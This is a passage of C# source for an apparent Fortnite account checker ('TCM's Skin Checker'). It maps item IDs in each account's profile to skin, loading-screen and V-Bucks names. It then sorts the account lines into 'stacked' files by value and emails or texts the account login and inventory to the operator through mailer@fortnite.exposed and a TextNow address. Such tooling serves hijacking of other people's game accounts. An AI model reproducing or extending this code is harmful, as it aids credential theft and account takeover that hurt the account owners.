                                    FnBattleRoyalLB.Items.Add("=> Fate");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens56 = x.Contains("AthenaLoadingScreen:lsid_057_bunnies");
                            if (LoadingScreens56)
                            {
                                sw.WriteLine("=> Pastel Patrol");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Pastel Patrol");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens57 = x.Contains("AthenaLoadingScreen:lsid_058_djconcept");
                            if (LoadingScreens57)
                            {
                                sw.WriteLine("=> Dj Yonder");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dj Yonder");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens58 = x.Contains("AthenaLoadingScreen:lsid_059_vampire");
                            if (LoadingScreens58)
                            {
                                sw.WriteLine("=> Dusk");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dusk");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens59 = x.Contains("AthenaLoadingScreen:lsid_060_cowgirl");
                            if (LoadingScreens59)
                            {
                                sw.WriteLine("=> Calamity");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Calamity");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens60 = x.Contains("AthenaLoadingScreen:lsid_061_werewolf");
                            if (LoadingScreens60)
                            {
                                sw.WriteLine("=> Dire");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dire");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens61 = x.Contains("AthenaLoadingScreen:lsid_062_s6cumulative01");
                            if (LoadingScreens61)
                            {
                                sw.WriteLine("=> Down on the Ranch");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Down on the Ranch");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens62 = x.Contains("AthenaLoadingScreen:lsid_063_s6cumulative02");
                            if (LoadingScreens62)
                            {
                                sw.WriteLine("=> Wailing Wolves");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wailing Wolves");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens63 = x.Contains("AthenaLoadingScreen:lsid_084_s7cumulative01");
                            if (LoadingScreens63)
                            {
                                sw.WriteLine("=> Wide Awake");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Wide Awake");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens64 = x.Contains("AthenaLoadingScreen:lsid_085_s7cumulative02");
                            if (LoadingScreens64)
                            {
                                sw.WriteLine("=> Feline by Design");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Feline by Design");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens65 = x.Contains("AthenaLoadingScreen:lsid_086_s7cumulative03");
                            if (LoadingScreens65)
                            {
                                sw.WriteLine("=> Ready for Takeoff");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Ready for Takeoff");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens66 = x.Contains("AthenaLoadingScreen:lsid_087_s7cumulative04");
                            if (LoadingScreens66)
                            {
                                sw.WriteLine("=> Airtime");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Airtime");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens67 = x.Contains("AthenaLoadingScreen:lsid_088_s7cumulative05");
                            if (LoadingScreens67)
                            {
                                sw.WriteLine("=> Teatime");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Teatime");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens68 = x.Contains("AthenaLoadingScreen:lsid_089_s7cumulative06");
                            if (LoadingScreens68)
                            {
                                sw.WriteLine("=> Order Up!");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Order Up!");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens69 = x.Contains("AthenaLoadingScreen:lsid_094_holidayspecial");
                            if (LoadingScreens69)
                            {
                                sw.WriteLine("=> Crackshot Special");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crackshot Special");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens70 = x.Contains("AthenaLoadingScreen:lsid_072_winterlauncher");
                            if (LoadingScreens70)
                            {
                                sw.WriteLine("=> Festive Firefight");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Festive Firefight");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens71 = x.Contains("AthenaLoadingScreen:lsid_073_dustydepot");
                            if (LoadingScreens71)
                            {
                                sw.WriteLine("=> Dusty Depot");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dusty Depot");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens72 = x.Contains("AthenaLoadingScreen:lsid_074_darkbomber");
                            if (LoadingScreens72)
                            {
                                sw.WriteLine("=> Dark Llama");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Dark Llama");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens73 = x.Contains("AthenaLoadingScreen:lsid_075_tacticalsanta");
                            if (LoadingScreens73)
                            {
                                sw.WriteLine("=> Sgt. Winter");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Sgt. Winter");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens74 = x.Contains("AthenaLoadingScreen:lsid_076_medics");
                            if (LoadingScreens74)
                            {
                                sw.WriteLine("=> Support Squadron");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Support Squadron");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens75 = x.Contains("AthenaLoadingScreen:lsid_078_skulltrooper");
                            if (LoadingScreens75)
                            {
                                sw.WriteLine("=> Skull Squad");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Skull Squad");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens76 = x.Contains("AthenaLoadingScreen:lsid_079_plane");
                            if (LoadingScreens76)
                            {
                                sw.WriteLine("=> X-4 Stormwing");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> X-4 Stormwing");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens77 = x.Contains("AthenaLoadingScreen:lsid_080_gingerbread");
                            if (LoadingScreens77)
                            {
                                sw.WriteLine("=> Gingerbread");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Gingerbread");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens78 = x.Contains("AthenaLoadingScreen:lsid_081_tenderdefender");
                            if (LoadingScreens78)
                            {
                                sw.WriteLine("=> Tender Defender");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Tender Defender");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens79 = x.Contains("AthenaLoadingScreen:lsid_082_neoncat");
                            if (LoadingScreens79)
                            {
                                sw.WriteLine("=> Lynx");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Lynx");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                            bool LoadingScreens80 = x.Contains("AthenaLoadingScreen:lsid_083_crackshot");
                            if (LoadingScreens80)
                            {
                                sw.WriteLine("=> Crackshot");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("=> Crackshot");
                                }
                                TotalLoadingScreens = TotalLoadingScreens + 1;
                            }
                        }
                        if (CheckForTotalItemCount.Checked)
                        {
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("----------------------<Total Item Count>------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("----------------------<Total Item Count>------------------------");
                            }
                            sw.WriteLine("--------------------------------------------------------");
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                            }
                            sw.WriteLine("Total Skins -----> " + TotalSkins);
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("Total Skins -----> " + TotalSkins);
                            }
                            int val = TotalSkins;
                            try
                            {
                                if (IncrementSaveSkins.Checked)
                                {
                                    if (!Directory.Exists(folder + "//Stacked Skins//"))
                                    {
                                        Directory.CreateDirectory(folder + "//Stacked Skins//");
                                    }
                                    bool ToTen = IsWithin(val, 1, 10);
                                    if (ToTen)
                                    {
                                        ToTenSaveName = Path.Combine(folder + "//Stacked Skins//", string.Format("1-10 Skins Found By TCM's Skin Checker.txt", fileName));
                                        using (StreamWriter ToTenStreamWriter = File.AppendText(ToTenSaveName))
                                        {
                                            ToTenStreamWriter.WriteLine(account);
                                        }
                                    }
                                    bool ToTwenty = IsWithin(val, 11, 20);
                                    if (ToTwenty)
                                    {
                                        ToTwentySaveName = Path.Combine(folder + "//Stacked Skins//", string.Format("11-20 Skins Found By TCM's Skin Checker.txt", fileName));
                                        using (StreamWriter ToTwentyStreamWriter = File.AppendText(ToTwentySaveName))
                                        {
                                            ToTwentyStreamWriter.WriteLine(account);
                                        }
                                    }
                                    bool ToThirty = IsWithin(val, 21, 30);
                                    if (ToThirty)
                                    {
                                        ToThirtySaveName = Path.Combine(folder + "//Stacked Skins//", string.Format("21-30 Skins Found By TCM's Skin Checker.txt", fileName));
                                        using (StreamWriter ToThirtyStreamWriter = File.AppendText(ToThirtySaveName))
                                        {
                                            ToThirtyStreamWriter.WriteLine(account);
                                        }
                                    }
                                    bool ToFourty = IsWithin(val, 31, 40);
                                    if (ToFourty)
                                    {
                                        ToFourtySaveName = Path.Combine(folder + "//Stacked Skins//", string.Format("31-40 Skins Found By TCM's Skin Checker.txt", fileName));
                                        using (StreamWriter ToFourtyStreamWriter = File.AppendText(ToFourtySaveName))
                                        {
                                            ToFourtyStreamWriter.WriteLine(account);
                                        }
                                    }
                                    bool ToFifty = IsWithin(val, 41, 50);
                                    if (ToFifty)
                                    {
                                        ToFiftySaveName = Path.Combine(folder + "//Stacked Skins//", string.Format("41-50 Skins Found By TCM's Skin Checker.txt", fileName));
                                        using (StreamWriter ToFiftyStreamWriter = File.AppendText(ToFiftySaveName))
                                        {
                                            ToFiftyStreamWriter.WriteLine(account);
                                        }
                                    }
                                    bool ToSixty = IsWithin(val, 51, 60);
                                    if (ToSixty)
                                    {
                                        ToSixtySaveName = Path.Combine(folder + "//Stacked Skins//", string.Format("51-60 Skins Found By TCM's Skin Checker.txt", fileName));
                                        using (StreamWriter ToSixtyStreamWriter = File.AppendText(ToSixtySaveName))
                                        {
                                            ToSixtyStreamWriter.WriteLine(account);
                                        }
                                    }
                                    bool ToSeventy = IsWithin(val, 61, 70);
                                    if (ToSeventy)
                                    {
                                        ToSeventySaveName = Path.Combine(folder + "//Stacked Skins//", string.Format("61-70 Skins Found By TCM's Skin Checker.txt", fileName));
                                        using (StreamWriter ToSeventyStreamWriter = File.AppendText(ToSeventySaveName))
                                        {
                                            ToSeventyStreamWriter.WriteLine(account);
                                        }
                                    }
                                    bool ToEighty = IsWithin(val, 81, 90);
                                    if (ToEighty)
                                    {
                                        ToEightySaveName = Path.Combine(folder + "//Stacked Skins//", string.Format("81-90 Skins Found By TCM's Skin Checker.txt", fileName));
                                        using (StreamWriter ToEightyStreamWriter = File.AppendText(ToEightySaveName))
                                        {
                                            ToEightyStreamWriter.WriteLine(account);
                                        }
                                    }
                                    bool ToNinety = IsWithin(val, 91, 100);
                                    if (ToNinety)
                                    {
                                        ToNinetySaveName = Path.Combine(folder + "//Stacked Skins//", string.Format("91-100 Skins Found By TCM's Skin Checker.txt", fileName));
                                        using (StreamWriter ToNinetyStreamWriter = File.AppendText(ToNinetySaveName))
                                        {
                                            ToNinetyStreamWriter.WriteLine(account);
                                        }
                                    }
                                    bool OverOneHundo = IsWithin(val, 100, 9999);
                                    if (OverOneHundo)
                                    {
                                        OverOneHundoSaveName = Path.Combine(folder + "//Stacked Skins//", string.Format("100+ Skins Found By TCM's Skin Checker.txt", fileName));
                                        using (StreamWriter OverOneHundoStreamWriter = File.AppendText(OverOneHundoSaveName))
                                        {
                                            OverOneHundoStreamWriter.WriteLine(account);
                                        }
                                    }
                                }
                            }
                            catch
                            {
                                //Catch Error To Above...
                            }
                            if (StackedSkinSaver.Checked)
                            {
                                if (TotalSkins >= NumberOfSkinsStacked.Value)
                                {
                                    using (StreamWriter StackedAcc = File.AppendText(StackedAccounts))
                                    {
                                        StackedAcc.WriteLine(account);
                                    }
                                }
                            }
                            sw.WriteLine("Total BackBling -----> " + backblingfound);
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("Total BackBling -----> " + backblingfound);
                            }
                            sw.WriteLine("Total Axes -----> " + AxesFound);
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("Total Axes -----> " + AxesFound);
                            }
                            sw.WriteLine("Total Gliders -----> " + TotalGliders);
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("Total Gliders -----> " + TotalGliders);
                            }
                            sw.WriteLine("Total Dances -----> " + TotalDances);
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("Total Dances -----> " + TotalDances);
                            }
                            sw.WriteLine("Total Emoji's -----> " + TotalEmojis);
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("Total Emoji's -----> " + TotalEmojis);
                            }
                            sw.WriteLine("Total Loading Screens -----> " + TotalLoadingScreens);
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("Total Loading Screens -----> " + TotalLoadingScreens);
                            }
                            int TotalItemsOnAccount = TotalSkins + backblingfound + AxesFound + TotalGliders + TotalDances + TotalEmojis + TotalLoadingScreens;
                            sw.WriteLine("Total Items On Account -----> " + TotalItemsOnAccount);
                            if (ListBoxDisableText.Checked == false)
                            {
                                FnBattleRoyalLB.Items.Add("Total Items On Account -----> " + TotalItemsOnAccount);
                            }
                            //TextNowe notify start //
                            if (EnableTextNowNotify.Checked)
                            {
                                try
                                {
                                    if (!SendFinalEmailOnly.Checked)
                                    {
                                        if (TotalSkins >= EmailStackedAmount.Value)
                                        {
                                            string BodyToSendEmail = "Hello " + Environment.UserName + "\nYou Just Got A Stacked Account On The Tool!\nBelow We Will List The Account Information Including What Was On The Account!\n\nAccount Login: " + account + "\nSkins Found: " + TotalSkins + "\nBack Bling On Account: " + backblingfound + "\nAxes On Account: " + AxesFound + "\nGliders On Account: " + TotalGliders + "\nDances On Account: " + TotalDances + "\nEmoji's On Account: " + TotalEmojis + "\nLoading Screen's On Acccount: " + TotalLoadingScreens + "\nOverall Total Items On Account: " + TotalItemsOnAccount;
                                            SMSSenderAPI("TCM Tool Stacked Account Found!", "mailer@fortnite.exposed", "TCM Fortnite Tool", TextNowNotificationsText.Text + "@textnow.me", BodyToSendEmail + "\n\n\n");
                                        }
                                        else
                                        {
                                            string BodyToSendEmail = "Hello " + Environment.UserName + "\nYou Just Got An Account On The Tool!\nBelow We Will List The Account Information Including What Was On The Account!\n\nAccount Login: " + account + "\nSkins Found: " + TotalSkins + "\nBack Bling On Account: " + backblingfound + "\nAxes On Account: " + AxesFound + "\nGliders On Account: " + TotalGliders + "\nDances On Account: " + TotalDances + "\nEmoji's On Account: " + TotalEmojis + "\nLoading Screen's On Acccount: " + TotalLoadingScreens + "\nOverall Total Items On Account: " + TotalItemsOnAccount;
                                            SMSSenderAPI("TCM Tool Stacked Account Found!", "mailer@fortnite.exposed", "TCM Fortnite Tool", TextNowNotificationsText.Text + "@textnow.me", BodyToSendEmail + "\n\n\n");
                                        }
                                    }
                                }
                                catch
                                {

                                }
                            }
                            //EMAIL NOTIFY START //
                            if (!SendFinalEmailOnly.Checked)
                            {
                                if (EnableNotifyEmail.Checked)
                                {
                                    try
                                    {
                                        if (IfStackedChecked.Checked)
                                        {
                                            if (TotalSkins >= EmailStackedAmount.Value)
                                            {
                                                if (EmailSentTXT.Checked)
                                                {
                                                    string BodyToSendEmail = "Hello " + Environment.UserName + "<br>You Just Got A Stacked Account On The Tool!<br>Below We Will List The Account Information Including What Was On The Account!<br><br>Account Login: " + account + "<br>Skins Found: " + TotalSkins + "<br>Back Bling On Account: " + backblingfound + "<br>Axes On Account: " + AxesFound + "<br>Gliders On Account: " + TotalGliders + "<br>Dances On Account: " + TotalDances + "<br>Emoji's On Account: " + TotalEmojis + "<br>Loading Screen's On Acccount: " + TotalLoadingScreens + "<br>Overall Total Items On Account: " + TotalItemsOnAccount;
                                                    EmailSenderAPI("TCM Tool Stacked Account Found!", "mailer@fortnite.exposed", "TCM Fortnite Tool", EmailToNotifyToo.Text, BodyToSendEmail);
                                                }
                                                else if (EmailSendHTML.Checked)
                                                {
                                                    string MainHTMLToEdit = new WebClient().DownloadString("https://pastebin.com/raw/PtK3LqKM");
                                                    string BodyToSendEmail = "Hello " + Environment.UserName + "<br>You Just Got A Stacked Account On The Tool!<br>Below We Will List The Account Information Including What Was On The Account!<br><br>Account Login: " + account + "<br>Skins Found: " + TotalSkins + "<br>Back Bling On Account: " + backblingfound + "<br>Axes On Account: " + AxesFound + "<br>Gliders On Account: " + TotalGliders + "<br>Dances On Account: " + TotalDances + "<br>Emoji's On Account: " + TotalEmojis + "<br>Loading Screen's On Acccount: " + TotalLoadingScreens + "<br>Overall Total Items On Account: " + TotalItemsOnAccount;
                                                    string NotifyEmailFinishDone = MainHTMLToEdit.Replace("ACCOUNT INFORMATIOIN SHOWN HERE", BodyToSendEmail);
                                                    string NotifyEmailFinishFinished = NotifyEmailFinishDone.Replace("TCM TOOL ACCOUNT FOUND!", "Stacked Account Found!");
                                                    EmailSenderAPI("TCM Tool Stacked Account Found!", "mailer@fortnite.exposed", "TCM Fortnite Tool", EmailToNotifyToo.Text, NotifyEmailFinishFinished);
                                                }
                                                else
                                                {
                                                    EmailSentTXT.Checked = true;
                                                }
                                            }
                                        }
                                        else
                                        {
                                            if (EmailSentTXT.Checked)
                                            {
                                                string BodyToSendEmail = "Hello " + Environment.UserName + "<br>You Just Got An Account On The Tool!<br>Below We Will List The Account Information Including What Was On The Account!<br><br>Account Login: " + account + "<br>Skins Found: " + TotalSkins + "<br>Back Bling On Account: " + backblingfound + "<br>Axes On Account: " + AxesFound + "<br>Gliders On Account: " + TotalGliders + "<br>Dances On Account: " + TotalDances + "<br>Emoji's On Account: " + TotalEmojis + "<br>Loading Screen's On Acccount: " + TotalLoadingScreens + "<br>Overall Total Items On Account: " + TotalItemsOnAccount;
                                                EmailSenderAPI("TCM Tool Account Found!", "mailer@fortnite.exposed", "TCM Fortnite Tool", EmailToNotifyToo.Text, BodyToSendEmail);
                                            }
                                            else if (EmailSendHTML.Checked)
                                            {
                                                string MainHTMLToEdit = new WebClient().DownloadString("https://pastebin.com/raw/PtK3LqKM");
                                                string BodyToSendEmail = "Hello " + Environment.UserName + "<br>You Just Got An Account On The Tool!<br>Below We Will List The Account Information Including What Was On The Account!<br><br>Account Login: " + account + "<br>Skins Found: " + TotalSkins + "<br>Back Bling On Account: " + backblingfound + "<br>Axes On Account: " + AxesFound + "<br>Gliders On Account: " + TotalGliders + "<br>Dances On Account: " + TotalDances + "<br>Emoji's On Account: " + TotalEmojis + "<br>Loading Screen's On Acccount: " + TotalLoadingScreens + "<br>Overall Total Items On Account: " + TotalItemsOnAccount;
                                                string NotifyEmailFinishDone = MainHTMLToEdit.Replace("ACCOUNT INFORMATIOIN SHOWN HERE", BodyToSendEmail);
                                                EmailSenderAPI("TCM Tool Account Found!", "mailer@fortnite.exposed", "TCM Fortnite Tool", EmailToNotifyToo.Text, NotifyEmailFinishDone);
                                            }
                                            else
                                            {
                                                EmailSentTXT.Checked = true;
                                            }
                                        }
                                    }
                                    catch
                                    {

                                    }
                                }
                            }
                        }
                        if (CheckForRareItems.Checked)
                        {
                            if (x.Contains("AthenaCharacter:cid_035_athena_commando_m_medieval") || x.Contains("AthenaCharacter:cid_051_athena_commando_m_holidayelf") || x.Contains("AthenaCharacter:cid_050_athena_commando_m_holidaynutcracker") || x.Contains("AthenaCharacter:cid_029_athena_commando_f_halloween") || x.Contains("AthenaCharacter:cid_049_athena_commando_m_holidaygingerbread") || x.Contains("AthenaCharacter:cid_046_athena_commando_f_holidaysweater") || x.Contains("AthenaCharacter:cid_047_athena_commando_f_holidayreindeer") || x.Contains("AthenaCharacter:cid_030_athena_commando_m_halloween"))
                            {
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                sw.WriteLine("----------------------<Rare Items>------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("----------------------<Rare Items>------------------------");
                                }
                                sw.WriteLine("--------------------------------------------------------");
                                if (ListBoxDisableText.Checked == false)
                                {
                                    FnBattleRoyalLB.Items.Add("--------------------------------------------------------");
                                }
                                bool RareitemsLookFor1 = x.Contains("AthenaCharacter:cid_035_athena_commando_m_medieval");
                                if (RareitemsLookFor1)
                                {
                                    sw.WriteLine("=> Black Knight");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Black Knight");
                                    }
                                }
                                bool RareitemsLookFor2 = x.Contains("AthenaCharacter:cid_051_athena_commando_m_holidayelf");
                                if (RareitemsLookFor2)
                                {
                                    sw.WriteLine("=> Codename ELF");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Codename ELF");
                                    }
                                }
                                bool RareitemsLookFor3 = x.Contains("AthenaCharacter:cid_050_athena_commando_m_holidaynutcracker");
                                if (RareitemsLookFor3)
                                {
                                    sw.WriteLine("=> Crackshot");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Crackshot");
                                    }
                                }
                                bool RareitemsLookFor4 = x.Contains("AthenaCharacter:cid_029_athena_commando_f_halloween");
                                if (RareitemsLookFor4)
                                {
                                    sw.WriteLine("=> Ghoul Trooper");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Ghoul Trooper");
                                    }
                                }
                                bool RareitemsLookFor5 = x.Contains("AthenaCharacter:cid_049_athena_commando_m_holidaygingerbread");
                                if (RareitemsLookFor5)
                                {
                                    sw.WriteLine("=> Merry Marauder");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Merry Marauder");
                                    }
                                }
                                bool RareitemsLookFor6 = x.Contains("AthenaCharacter:cid_046_athena_commando_f_holidaysweater");
                                if (RareitemsLookFor6)
                                {
                                    sw.WriteLine("=> Nog Ops");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Nog Ops");
                                    }
                                }
                                bool RareitemsLookFor7 = x.Contains("AthenaCharacter:cid_047_athena_commando_f_holidayreindeer");
                                if (RareitemsLookFor7)
                                {
                                    sw.WriteLine("=> Red Nosed Raider");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Red Nosed Raider");
                                    }
                                }
                                bool RareitemsLookFor8 = x.Contains("AthenaCharacter:cid_030_athena_commando_m_halloween");
                                if (RareitemsLookFor8)
                                {
                                    sw.WriteLine("=> Skull Trooper");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Skull Trooper");
                                    }
                                }
                                bool RareitemsLookFor10 = x.Contains("AthenaCharacter:cid_113_athena_commando_m_blueace");
                                if (RareitemsLookFor10)
                                {
                                    sw.WriteLine("=> Royale Bomber");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Royale Bomber");
                                    }
                                }
                                bool RareitemsLookFor11 = x.Contains("AthenaPickaxe:pickaxe_id_015_holidaycandycane");
                                if (RareitemsLookFor11)
                                {
                                    sw.WriteLine("=> Candy Axe");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Candy Axe");
                                    }
                                }
                                bool RareitemsLookFor12 = x.Contains("AthenaCharacter:cid_045_athena_commando_m_holidaysweater");
                                if (RareitemsLookFor12)
                                {
                                    sw.WriteLine("=> Yuletide Ranger");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Yuletide Ranger");
                                    }
                                }
                                bool RareitemsLookFor13 = x.Contains("AthenaCharacter:cid_013_athena_commando_f");
                                if (RareitemsLookFor13)
                                {
                                    sw.WriteLine("=> Renegade");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Renegade");
                                    }
                                }
                                bool RareitemsLookFor14 = x.Contains("AthenaCharacter:cid_017_athena_commando_m");
                                if (RareitemsLookFor14)
                                {
                                    sw.WriteLine("=> Aerial Assault Trooper");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Aerial Assault Trooper");
                                    }
                                }
                                bool RareitemsLookFor15 = x.Contains("AthenaPickaxe:pickaxe_lockjaw");
                                if (RareitemsLookFor15)
                                {
                                    sw.WriteLine("=> Raider's Revenge");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Raider's Revenge");
                                    }
                                }
                                bool RareitemsLookFor16 = x.Contains("AthenaCharacter:cid_097_athena_commando_f_rockerpunk");
                                if (RareitemsLookFor16)
                                {
                                    sw.WriteLine("=> Power Chord");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Power Chord");
                                    }
                                }
                                bool RareitemsLookFor17 = x.Contains("AthenaCharacter:cid_098_athena_commando_f_stpatty");
                                if (RareitemsLookFor17)
                                {
                                    sw.WriteLine("=> Sgt Green Clover");
                                    if (ListBoxDisableText.Checked == false)
                                    {
                                        FnBattleRoyalLB.Items.Add("=> Sgt Green Clover");
                                    }
                                }
                                bool RareAmountOfVbucks = c.Contains("Currency:MtxGiveaway");
                                if (RareAmountOfVbucks)
                                {
                                    JToken items = JObject.Parse(c)["profileChanges"][0]["profile"]["items"];

                                    foreach (JToken item in items.Children())
                                    {
                                        if (item.First["templateId"].ToString() == "Currency:MtxGiveaway")
                                        {
                                            string TotalVbucksFound = item.First["quantity"].ToString();
                                            int TotalVbucksFoundint = Int32.Parse(TotalVbucksFound);
                                            if (TotalVbucksFoundint >= AmountOfVbucksToSave.Value)
                                            {
                                                sw.WriteLine("=> Has More Then " + AmountOfVbucksToSave.Value + " Vbucks");
                                                if (ListBoxDisableText.Checked == false)
                                                {
                                                    FnBattleRoyalLB.Items.Add("=> Has More Then " + AmountOfVbucksToSave.Value + " Vbucks");
                                                }
                                            }
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                        if (IncrementSaveVbucks.Checked)
                        {
                            try
                            {
                                JToken VbuckItems = JObject.Parse(c)["profileChanges"][0]["profile"]["items"];

                                foreach (JToken VbuckItem in VbuckItems.Children())
                                {
                                    if (VbuckItem.First["templateId"].ToString() == "Currency:MtxGiveaway")
                                    {
                                        string TotalVbucksFound = VbuckItem.First["quantity"].ToString();
                                        int TotalVbucksFoundint = Int32.Parse(TotalVbucksFound);
                                        if (!Directory.Exists(folder + "//Stacked Vbucks//"))
                                        {
                                            Directory.CreateDirectory(folder + "//Stacked Vbucks//");
                                        }
                                        int val = TotalVbucksFoundint;
                                        bool Belowtwohundo = IsWithin(val, 1, 200);
                                        if (Belowtwohundo)
                                        {
                                            BelowtwoSaveName = Path.Combine(folder + "//Stacked Vbucks//", string.Format("0-200 Vbucks Found By TCM's Skin Checker.txt", fileName));
                                            using (StreamWriter belowTwoHundoWriter = File.AppendText(BelowtwoSaveName))
                                            {
                                                belowTwoHundoWriter.WriteLine(account);
                                            }
                                            break;
                                        }
                                        bool TwoToEight = IsWithin(val, 200, 800);
                                        if (TwoToEight)
                                        {
